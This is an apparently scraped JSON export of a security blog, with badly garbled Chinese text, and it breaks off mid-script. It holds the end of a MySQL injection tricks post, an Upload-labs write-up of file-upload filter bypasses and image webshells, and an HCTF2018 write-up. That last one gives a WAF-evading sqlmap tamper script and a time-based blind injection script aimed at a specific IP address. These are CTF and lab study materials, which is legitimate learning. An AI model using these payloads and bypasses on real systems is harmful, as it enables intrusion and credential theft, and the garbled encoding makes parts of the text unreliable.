extractive1select * from user where uid=-1 and (extractvalue(1,concat(0x7e,(select (LOAD_FILE('Y:/1.php'))),0x7e))); load_file + isnull + updatexml1select * from user where username = '' and updatexml(0,concat(0x7e,isnull(LOAD_FILE('D:/1.php')),0x7e),0); å­˜åœ¨æ–‡ä»¶ è¿”å›0ä¸å­˜åœ¨æ–‡ä»¶ è¿”å›1 Dumpfile1SELECT _utf8'Hello world!' INTO DUMPFILE 'Y:/world.php'; Case When Powè¿ç®—ç¬¦ä½œæ¡ä»¶åˆ¤æ–­ï¼Œå¦‚æœé”™è¯¯æ•°æ®åº“æŠ¥é”™ï¼šåˆ©ç”¨powçš„æº¢å‡ºåˆ¤æ–­limitä½æ•°çš„ascii In ä¸çŸ¥é“åˆ—åçš„æ³¨å…¥çœ‹åŸæ–‡æ¯”è¾ƒå¥½ï¼Œç›´æ¥å¤ç°ä¸€ä¸‹ ThanksMySQLi Cookbooklcamryâ€™s blogæŠ¥é”™æ³¨å…¥é‚‚é€…load_file&amp;into outfileæ­è®ªLINESsqli-extracting-data-without-knowing-columns-namewangyihang-sqli-labs-Scriptå²ä¸Šæœ€æ°´çš„MYSQLæ³¨å…¥æ€»ç»“","categories":[{"name":"SQLi Tricks","slug":"SQLi-Tricks","permalink":"http://patrilic.top/categories/SQLi-Tricks/"}],"tags":[{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"http://patrilic.top/tags/SQLæ³¨å…¥/"}]},{"title":"Upload-labs Writeup","slug":"Upload-labs Writeup","date":"2019-04-05T03:20:33.000Z","updated":"2019-08-20T15:31:54.302Z","comments":true,"path":"2019/04/05/Upload-labs Writeup/","link":"","permalink":"http://patrilic.top/2019/04/05/Upload-labs Writeup/","excerpt":"","text":"@Author: Patrilic@Time: 2019-01-05 11:20:33 Pass-01JSåˆ¤æ–­ç›´æ¥ç¦ç”¨jså°±è¡Œäº† Pass-02å¸¸è§„ç»•è¿‡ï¼ŒContent-type Pass-031234567$deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º å¦‚æœæœåŠ¡å™¨è§£æphp5ï¼Œphtmlç±»ä¼¼çš„å°±å¯ä»¥ç›´æ¥ä¸Šä¼ ï¼Œä¹Ÿæ²¡æœ‰é™åˆ¶.htaccessæ–¹å¼å¤šç§ Pass-041234567$deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\"php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\"pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º è¿‡æ»¤äº†ä¸€å †åç¼€ï¼Œç„¶è€Œå¹¶æ²¡æœ‰è¿‡æ»¤.htaccessæ–‡ä»¶ï¼Œè€Œä¸”é€»è¾‘ä¹Ÿæœ‰é—®é¢˜ï¼Œå…ˆè¿›è¡Œäº†å…¨éƒ¨çš„å¤§å°å†™å…ˆä¸Šä¼ ä¸€ä¸ª.htaccessæ–‡ä»¶1SetHandler application/x-httpd-php ç„¶åä¼ å›¾ç‰‡é©¬å°±è¡Œäº† Pass-05123456$deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º è¿‡æ»¤äº†.htaccessï¼ŒåŒæ ·å¯ä»¥å¤§å°å†™ç»•è¿‡ Pass-06123456$deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA æ²¡æœ‰ç»è¿‡trim() å¸¦ä¸ªç©ºæ ¼å°±ç»•è¿‡äº† Pass-07123456$deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º è¿™é“é¢˜æˆ‘è‡ªå·±ä¹Ÿæ˜¯è·Ÿç½‘ä¸Šä¸€æ ·ï¼Œæ‹¿.ç»•è¿‡çš„ï¼Œä½†æ˜¯åœ¨linuxæœºå™¨ä¸Šå°±ä¸è¡Œäº† Pass-08123456$deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = trim($file_ext); //é¦–å°¾å»ç©º æ²¡è¿‡æ»¤::$DATAï¼Œåˆ©ç”¨windowsç‰¹æ€§ï¼Œç»•è¿‡å³å¯ Pass-0912345678910111213141516171819$deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'; &#125; $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name; Pass-101234567891011$deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $img_path = UPLOAD_PATH.&apos;/&apos;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &apos;ä¸Šä¼ å‡ºé”™ï¼&apos;; &#125; æ¼æ´è¯­å¥ï¼š $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);åŒå†™ç»•è¿‡å³å¯ Pass-111234567891011121314$ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else&#123; $msg = \"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼\"; &#125; å¯ä»¥çœ‹åˆ°$img_path1$img_path = $_GET[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; åˆ©ç”¨%00æˆªæ–­è®©save_pathç›´æ¥ç­‰äºfilenameï¼Œè®©filenameå¯æ§ï¼ŒåŒæ—¶ä¸Šä¼ æˆphp Pass-12å’Œ11å…³ä¸€æ ·ï¼Œåªæ˜¯save_pathé€šè¿‡postä¼ å…¥ä¿®æ”¹æˆ00å³å¯ Pass-13ä»»åŠ¡å˜äº†2333 åªè¦æ±‚ä¼ å›¾ç‰‡é©¬ï¼Œç¨³ 1copy pic.jpg /b + phpinfo.php /a webshell.jpg ç›´æ¥ä¸Šä¼ å°±è¡Œ éšè—äº†æ¶æ„ä»£ç  çœ‹ä¸€ä¸‹ä»£ç ï¼š12345678910111213141516171819202122function getReailFileType($filename)&#123; $file = fopen($filename, \"rb\"); $bin = fread($file, 2); //åªè¯»2å­—èŠ‚ fclose($file); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType;&#125; åªéœ€è¦çŸ¥é“ä»–çš„æ„æ€å°±æ˜¯æ£€æŸ¥äº†æ–‡ä»¶å¤´éƒ¨ï¼Œç„¶åç¡®å®šæ–‡ä»¶ç±»å‹ Pass-14è¿™å…³æ²¡ä»€ä¹ˆå¥½è®²çš„ï¼Œç›´æ¥å›¾ç‰‡é©¬å°±å¯ä»¥ç»•1234567891011121314function isImage($filename)&#123; $types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125; å®ƒä¸»è¦å°±æ˜¯è°ƒç”¨äº†ä¸€ä¸ªgetimagesize()å‡½æ•°ï¼Œ Pass-15åŒæ ·åˆ©ç”¨å›¾ç‰‡é©¬å°±è¡Œ123456789101112131415161718function isImage($filename)&#123; //éœ€è¦å¼€å¯php_exifæ¨¡å— $image_type = exif_imagetype($filename); switch ($image_type) &#123; case IMAGETYPE_GIF: return \"gif\"; break; case IMAGETYPE_JPEG: return \"jpg\"; break; case IMAGETYPE_PNG: return \"png\"; break; default: return false; break; &#125;&#125; åˆ©ç”¨exif_imagetype()æ£€æµ‹å›¾ç‰‡ç±»å‹ Pass-16https://xz.aliyun.com/t/2657å†™çš„è¶…çº§è¯¦ç»†äº†ï¼Œå¯ä»¥å­˜ä¸€ä»½pdf Pass-17è¿™é“é¢˜æ˜¯å…¸å‹çš„æ¡ä»¶ç«äº‰1234567891011121314151617181920if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,\".\")+1); $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = \"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼\"; unlink($upload_file); &#125; &#125;else&#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125;&#125; å¯ä»¥çœ‹åˆ°ä»£ç åˆ¤æ–­æ˜¯å…ˆè¿›è¡Œä¸Šä¼ æ–‡ä»¶ï¼Œç„¶åå†è¿›è¡Œåˆ¤æ–­åç¼€ï¼Œè¿™æ ·å°±å­˜åœ¨ä¸€ä¸ªå…¸å‹çš„æ¡ä»¶ç«äº‰ Pass-18åŒæ ·æ˜¯æ¡ä»¶ç«äº‰æ¼æ´12345678910111213141516171819202122232425262728293031323334353637if (isset($_POST['submit']))&#123; require_once(\"./myupload.php\"); $imgFileName =time(); $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName); $status_code = $u-&gt;upload(UPLOAD_PATH); switch ($status_code) &#123; case 1: $is_upload = true; $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to; break; case 2: $msg = 'æ–‡ä»¶å·²ç»è¢«ä¸Šä¼ ï¼Œä½†æ²¡æœ‰é‡å‘½åã€‚'; break; case -1: $msg = 'è¿™ä¸ªæ–‡ä»¶ä¸èƒ½ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„ä¸´æ—¶æ–‡ä»¶å­˜å‚¨ç›®å½•ã€‚'; break; case -2: $msg = 'ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ ç›®å½•ä¸å¯å†™ã€‚'; break; case -3: $msg = 'ä¸Šä¼ å¤±è´¥ï¼Œæ— æ³•ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶ã€‚'; break; case -4: $msg = 'ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ çš„æ–‡ä»¶è¿‡å¤§ã€‚'; break; case -5: $msg = 'ä¸Šä¼ å¤±è´¥ï¼ŒæœåŠ¡å™¨å·²ç»å­˜åœ¨ç›¸åŒåç§°æ–‡ä»¶ã€‚'; break; case -6: $msg = 'æ–‡ä»¶æ— æ³•ä¸Šä¼ ï¼Œæ–‡ä»¶ä¸èƒ½å¤åˆ¶åˆ°ç›®æ ‡ç›®å½•ã€‚'; break; default: $msg = 'æœªçŸ¥é”™è¯¯ï¼'; break; &#125;&#125; Pass-191234567891011121314151617181920212223242526272829303132if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); /* $file_name = trim($_POST['save_name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º */ $file_name = $_POST['save_name']; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125;else&#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125;else&#123; $msg = 'ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125; åˆ©ç”¨apacheè§£æ0x00æ¥è¿›è¡Œç»•è¿‡æˆ–è€…åˆ©ç”¨move_uploaded_file ä¸è§£ææœ«å°¾çš„\\.æ¥ç»•è¿‡ Pass-2012345678910111213141516171819202122232425262728if(!empty($_FILES['upload_file']))&#123; //mime check $allow_type = array('image/jpeg','image/png','image/gif'); if(!in_array($_FILES['upload_file']['type'],$allow_type))&#123; $msg = \"ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!\"; &#125;else&#123; //check filename $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name']; if (!is_array($file)) &#123; $file = explode('.', strtolower($file)); &#125; $ext = end($file); $allow_suffix = array('jpg','png','gif'); if (!in_array($ext, $allow_suffix)) &#123; $msg = \"ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!\"; &#125;else&#123; $file_name = reset($file) . '.' . $file[count($file) - 1]; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = \"æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼\"; $is_upload = true; &#125; else &#123; $msg = \"æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼\"; &#125; &#125; &#125; è¿™é“é¢˜ä¹Ÿæ˜¯ctfä¸­å¸¸è§çš„é¢˜å‹äº†ï¼Œä¸€å…±å°±ä¸¤ä¸ªç‚¹ï¼Œä¸€ä¸ªæ˜¯æ•°ç»„åˆ¤æ–­123if (!is_array($file)) &#123; $file = explode('.', strtolower($file)); &#125; å¦å¤–ä¸€ä¸ªå°±æ˜¯åˆ©ç”¨æ•°ç»„å»ç»•è¿‡åç¼€æ£€æµ‹åŒæ—¶ä¿ç•™æ–‡ä»¶å1$file_name = reset($file) . '.' . $file[count($file) - 1]; æ¯”è¾ƒç®€å•ï¼Œå°±ä¸ç»†è¯´äº†åªæœ‰ä¸€ä¸ªæ³¨æ„ç‚¹å°±æ˜¯ç”¨\\å»åƒæ‰åé¢çš„.ç„¶åç»è¿‡move_uploaded_file()é™¤æ‰åé¢çš„.æˆåŠŸä¸Šä¼ ","categories":[{"name":"Write-up","slug":"Write-up","permalink":"http://patrilic.top/categories/Write-up/"}],"tags":[{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","permalink":"http://patrilic.top/tags/æ–‡ä»¶ä¸Šä¼ /"}]},{"title":"HCTF2018 Kzone Write-up","slug":"HCTF2018 Kzone Write-up","date":"2019-04-03T15:20:33.000Z","updated":"2019-08-20T15:29:51.728Z","comments":true,"path":"2019/04/03/HCTF2018 Kzone Write-up/","link":"","permalink":"http://patrilic.top/2019/04/03/HCTF2018 Kzone Write-up/","excerpt":"","text":"0x01 Analyse www.zipå†…å®¹ 123456789101112131415161718192021â”œâ”€â”€ 2018.phpâ”œâ”€â”€ Default account&amp;password.txtâ”œâ”€â”€ Tutorial.txtâ”œâ”€â”€ adminâ”‚ â”œâ”€â”€ delete.phpâ”‚ â”œâ”€â”€ index.phpâ”‚ â”œâ”€â”€ list.phpâ”‚ â”œâ”€â”€ login.phpâ”‚ â””â”€â”€ pass.phpâ”œâ”€â”€ config.phpâ”œâ”€â”€ includeâ”‚ â”œâ”€â”€ common.phpâ”‚ â”œâ”€â”€ db.class.phpâ”‚ â”œâ”€â”€ function.phpâ”‚ â”œâ”€â”€ kill.intercept.phpâ”‚ â”œâ”€â”€ member.phpâ”‚ â”œâ”€â”€ os.phpâ”‚ â””â”€â”€ safe.phpâ”œâ”€â”€ index.phpâ”œâ”€â”€ install.sqlâ””â”€â”€ robots.txt çœ‹2018.phpé‡Œ123456789101112131415161718&lt;?phprequire_once './include/common.php';$realip = real_ip();$ipcount = $DB-&gt;count(\"SELECT count(*) from fish_user where ip='$realip'\");if ($ipcount &lt; 3) &#123; $username = addslashes($_POST['user']); $password = addslashes($_POST['pass']); $address = getCity($realip); $time = date(\"Y-m-d H:i:s\"); $ua = $_SERVER['HTTP_USER_AGENT']; $device = get_device($ua); $sql = \"INSERT INTO `fish_user`(`username`, `password`, `ip`, `address`, `time`, `device`) VALUES ('&#123;$username&#125;','&#123;$password&#125;','&#123;$realip&#125;','&#123;$address&#125;','&#123;$time&#125;','&#123;$device&#125;')\"; $DB-&gt;query($sql); header(\"Location: https://i.qq.com/?rd=\" . $username);&#125; else &#123; header(\"Location: https://i.qq.com/?rd=\" . $username);&#125;?&gt; å¤§æ¦‚æ˜¯é’“é±¼ç½‘ç«™å¸¸è§„å¥—è·¯äº†ï¼Œå°±æ˜¯æŠŠç”¨æˆ·ä¿¡æ¯æ‰”è¿›æ•°æ®åº“ ä¸€ä¸ªä¸€ä¸ªç‚¹çœ‹ï¼Œå‘ç°Common.phpé‡ŒæŠŠsafe.phpéƒ½åŒ…å«äº† ç„¶åæ¥çœ‹safe.php12345678910111213141516171819202122232425262728&lt;?phpfunction waf($string)&#123; $blacklist = '/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|#|s/i'; return preg_replace_callback($blacklist, function ($match) &#123; return '@' . $match[0] . '@'; &#125;, $string);&#125;.....foreach ($_GET as $key =&gt; $value) &#123; if (is_string($value) &amp;&amp; !is_numeric($value)) &#123; $value = safe($value); &#125; $_GET[$key] = $value;&#125;foreach ($_POST as $key =&gt; $value) &#123; if (is_string($value) &amp;&amp; !is_numeric($value)) &#123; $value = safe($value); &#125; $_POST[$key] = $value;&#125;foreach ($_COOKIE as $key =&gt; $value) &#123; if (is_string($value) &amp;&amp; !is_numeric($value)) &#123; $value = safe($value); &#125; $_COOKIE[$key] = $value;&#125;?&gt; ç›´æ¥ç”¨ä¸€ä¸ªbacklistï¼Œç„¶åå°†Get/POST/Cookieä¸‰ç§ä¼ å‚æ–¹å¼å…¨éƒ¨è¿‡æ»¤äº†ä¸€éè·Ÿä¸€ä¸‹real_ip()123456789101112function real_ip()&#123; $ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : ''; if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) &#123; $list = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']); $ip = $list[0]; &#125; if (!ip2long($ip)) &#123; $ip = ''; &#125; return $ip;&#125; ä½¿ç”¨äº†ip2longæ¥è½¬æ¢äº†ipæ ¼å¼ï¼Œè¿™æ ·ä¹Ÿæ²¡åŠæ³•äº†.. ç»§ç»­å®¡è®¡ï¼Œæ‰¾æœ‰SQLäº¤äº’çš„åœ°æ–¹ 12345if (isset($_COOKIE[\"islogin\"])) &#123; if ($_COOKIE[\"login_data\"]) &#123; $login_data = json_decode($_COOKIE['login_data'], true); $admin_user = $login_data['admin_user']; $udata = $DB-&gt;get_row(\"SELECT * FROM fish_admin WHERE username='$admin_user' limit 1\"); è¿™é‡Œå¯ä»¥çœ‹åˆ°åˆ©ç”¨äº†ä¸€ä¸ªjson_decode()å‡½æ•°ï¼Œå°†$_COOKIEä¸­çš„login_dataå¸¦å…¥åˆ°SQLè¯­å¥ä¸­: SELECT * FROM fish_admin WHERE username=&#39;$admin_user&#39; limit 1 è¿™é‡Œå°±é€ æˆäº†ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨unicodeè¿›è¡Œç»•è¿‡ï¼Œå› ä¸ºjson_decodeæ˜¯å¯ä»¥å°†unicodeå­—ç¬¦è§£ç çš„ é‚£ä¹ˆï¼Œå°±å¯ä»¥ç›´æ¥bypassè¿›è¡Œæ³¨å…¥äº† 0x02 Exploitæˆ‘ä»¬åªç”¨unicodeå°±å¯ä»¥ç»•è¿‡çš„è¯ï¼Œå°±ç›¸å½“äºæ²¡æœ‰è¿‡æ»¤çš„æ³¨å…¥äº†ï¼Œå¯ä»¥é€‰æ‹©ä½¿ç”¨sqlmap or è‡ªå·±å†™è„šæœ¬ tamper 123456789101112131415161718192021222324252627#!/usr/bin/env pythonfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef dependencies(): passdef tamper(payload, **kwargs): data = '''&#123;\"admin_user\":\"%s\"&#125;;''' payload = payload.lower() payload = payload.replace('o', '\\u006f') payload = payload.replace('u', '\\u0075') payload = payload.replace('i', '\\u0069') payload = payload.replace('\\'', '\\u0027') payload = payload.replace('\\\"', '\\u0022') payload = payload.replace(' ', '\\u0020') payload = payload.replace('s', '\\u0073') payload = payload.replace('#', '\\u0023') payload = payload.replace('&gt;', '\\u003e') payload = payload.replace('&lt;', '\\u003c') payload = payload.replace('-', '\\u002d') payload = payload.replace('=', '\\u003d') payload = payload.replace('f1a9', 'F1a9') payload = payload.replace('f1', 'F1') return data % payload python 123456789101112131415161718192021import requestsimport timeurl = \"http://45.32.75.237:10000/admin/login.php\"flag = ''dic = \"0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;_ABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;()*+|,-./:;&lt;=&gt;?@\"for x in range(1,50): for i in dic: startTime = time.time() poc1 = \"'\\u006fr\\u0020su\\u0062str(passwo\\u0072d,&#123;0&#125;,1)\\u003d'&#123;1&#125;'\\u0020and\\u0020sl\\u0065ep(6)\\u0023\".format(x,chr(i)) admin BE933CBA048A9727A2D2E9E08F5ED046 poc2 = 